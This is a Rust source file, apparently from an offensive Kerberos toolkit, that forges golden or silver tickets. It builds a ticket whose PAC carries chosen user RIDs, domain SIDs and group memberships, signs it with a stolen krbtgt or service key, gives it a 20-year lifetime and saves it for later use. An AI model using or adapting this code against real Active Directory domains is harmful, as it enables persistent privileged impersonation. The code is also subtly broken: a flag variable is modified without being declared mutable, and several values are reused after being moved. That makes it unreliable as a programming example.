use crate::core::{
    new_nt_principal, new_pactype, new_principal_or_srv_inst, Cipher,
    CredentialFormat, KrbCredPlain, TicketCredInfo, Vault,
};
use crate::KerberosUser;
use crate::Result;
use chrono::{Duration, Utc};
use kerberos_asn1::{
    Asn1Object, AuthorizationData, EncTicketPart, EncryptedData, EncryptionKey,
    KrbCredInfo, PrincipalName, Ticket, TransitedEncoding,
};
use kerberos_constants::ad_types;
use kerberos_constants::etypes;
use kerberos_constants::key_usages;
use kerberos_constants::principal_names;
use kerberos_constants::ticket_flags;
use kerberos_crypto::Key;
use ms_pac::PACTYPE;
use ms_pac::PISID;

pub fn craft(
    user: KerberosUser,
    service: Option<String>,
    user_key: Key,
    user_rid: u32,
    realm_sid: PISID,
    groups: &[u32],
    etype: Option<i32>,
    cred_format: CredentialFormat,
    vault: &dyn Vault,
) -> Result<()> {
    let ticket_info = craft_ticket_info(
        user, service, user_key, user_rid, realm_sid, groups, etype,
    );

    let krb_cred_plain = KrbCredPlain::new(vec![ticket_info]);

    vault.save(krb_cred_plain, cred_format)?;

    return Ok(());
}

fn craft_ticket_info(
    user: KerberosUser,
    service: Option<String>,
    user_key: Key,
    user_rid: u32,
    domain_sid: PISID,
    groups: &[u32],
    etype: Option<i32>,
) -> TicketCredInfo {
    let cipher = Cipher::generate(&user_key, &user, etype);
    let session_key = random_key(cipher.etype());
    let spn = service.unwrap_or(format!("krbtgt/{}", &user.realm));
    let sname = new_principal_or_srv_inst(&spn, &user.realm);
    let now = Utc::now();
    let expiration_time =
        now.checked_add_signed(Duration::weeks(20 * 52)).unwrap();

    let tkt_flags = ticket_flags::FORWARDABLE
        | ticket_flags::PROXIABLE
        | ticket_flags::RENEWABLE;

    if sname.name_type == principal_names::NT_SRV_INST {
        tkt_flags |= ticket_flags::INITIAL;
    }

    let authtime = now.into();
    let starttime = now.into();
    let endtime = expiration_time.into();
    let renew_till = expiration_time.into();
    let cname = new_nt_principal(&user.name);
    let crealm = user.realm;
    let srealm = user.realm;
    let caddr = None;

    let krb_cred_info = KrbCredInfo {
        key: session_key.clone(),
        prealm: Some(crealm),
        pname: Some(cname),
        flags: Some(tkt_flags.into()),
        authtime: Some(authtime),
        starttime: Some(starttime),
        endtime: Some(endtime),
        renew_till: Some(renew_till),
        srealm: Some(srealm),
        sname: Some(sname.clone()),
        caddr: caddr,
    };

    let raw_signed_pac = create_signed_pac(
        &user.name,
        user_rid,
        &user.realm,
        domain_sid,
        groups,
        now.timestamp() as u64,
        cipher,
    )
    .build();

    let authorization_data = AuthorizationData {
        ad_type: ad_types::AD_WIN2K_PACK,
        ad_data: raw_signed_pac,
    };

    let enc_ticket_part = EncTicketPart {
        flags: tkt_flags.into(),
        key: session_key,
        crealm: crealm,
        cname: cname,
        transited: TransitedEncoding::default(),
        authtime: authtime,
        starttime: Some(starttime),
        endtime: endtime,
        renew_till: Some(renew_till),
        caddr: caddr,
        authorization_data: Some(authorization_data),
    };

    let enc_ticket_part_raw = enc_ticket_part.build();

    let encrypted_enc_ticket_part = cipher
        .encrypt(key_usages::KEY_USAGE_AS_REP_TICKET, &enc_ticket_part_raw);

    let ticket = Ticket {
        tkt_vno: 5,
        realm: srealm,
        sname: sname,
        enc_part: EncryptedData::new(
            cipher.etype(),
            None,
            encrypted_enc_ticket_part,
        ),
    };

    return TicketCredInfo::new(ticket, krb_cred_info);
}

fn create_signed_pac(
    username: &str,
    user_rid: u32,
    domain: &str,
    domain_sid: PISID,
    groups: &[u32],
    logon_time: u64,
    cipher: Cipher,
) -> PACTYPE {
    let pactype = new_pactype(
        username,
        user_rid,
        domain,
        domain_sid,
        groups,
        cipher.etype(),
        logon_time,
    );

    let raw_pactype = pactype.build();

    let server_sign = cipher
        .checksum(key_usages::KEY_USAGE_KERB_NON_KERB_CKSUM_SALT, &raw_pactype);
    let privsrv_sign = cipher
        .checksum(key_usages::KEY_USAGE_KERB_NON_KERB_CKSUM_SALT, &server_sign);

    let server_checksum = pactype.server_checksum_mut().unwrap();
    server_checksum.Signature = server_sign;

    let privsrv_checksum = pactype.privsrv_checksum_mut().unwrap();
    privsrv_checksum.Signature = privsrv_sign;

    return pactype;
}

pub struct EncTicketPartBuilder {
    ticket_flags: u32,
    key: EncryptionKey,
    crealm: String,
    cname: PrincipalName,
    authorization_data: Option<AuthorizationData>,
}

impl EncTicketPartBuilder {
    pub fn new(username: &str, realm: String) -> Self {
        let now = Utc::now().timestamp() as u64;
        return Self {
            ticket_flags: ticket_flags::FORWARDABLE
                | ticket_flags::PROXIABLE
                | ticket_flags::RENEWABLE,
            key: random_key(etypes::AES256_CTS_HMAC_SHA1_96),
            crealm: realm,
            cname: new_nt_principal(username),
            authorization_data: None,
        };
    }

    pub fn add_flag(mut self, flag: u32) -> Self {
        self.ticket_flags |= flag;
        self
    }

    pub fn key(mut self, key: EncryptionKey) -> Self {
        self.key = key;
        self
    }

    pub fn pac(mut self, pac: Vec<u8>) -> Self {
        self.authorization_data = Some(AuthorizationData {
            ad_type: ad_types::AD_WIN2K_PACK,
            ad_data: pac,
        });
        self
    }

    pub fn build(self) -> EncTicketPart {
        let now = Utc::now();
        let expiration_time =
            now.checked_add_signed(Duration::weeks(20 * 52)).unwrap();
        return EncTicketPart {
            flags: self.ticket_flags.into(),
            key: self.key,
            crealm: self.crealm,
            cname: self.cname,
            transited: TransitedEncoding::default(),
            authtime: now.into(),
            starttime: Some(now.into()),
            endtime: expiration_time.into(),
            renew_till: Some(expiration_time.into()),
            caddr: None,
            authorization_data: self.authorization_data,
        };
    }
}

fn random_key(etype: i32) -> EncryptionKey {
    return EncryptionKey {
        keytype: etype,
        keyvalue: Key::random(etype)
            .expect(&format!("Unsupported etype {}", etype))
            .as_bytes()
            .to_vec(),
    };
}
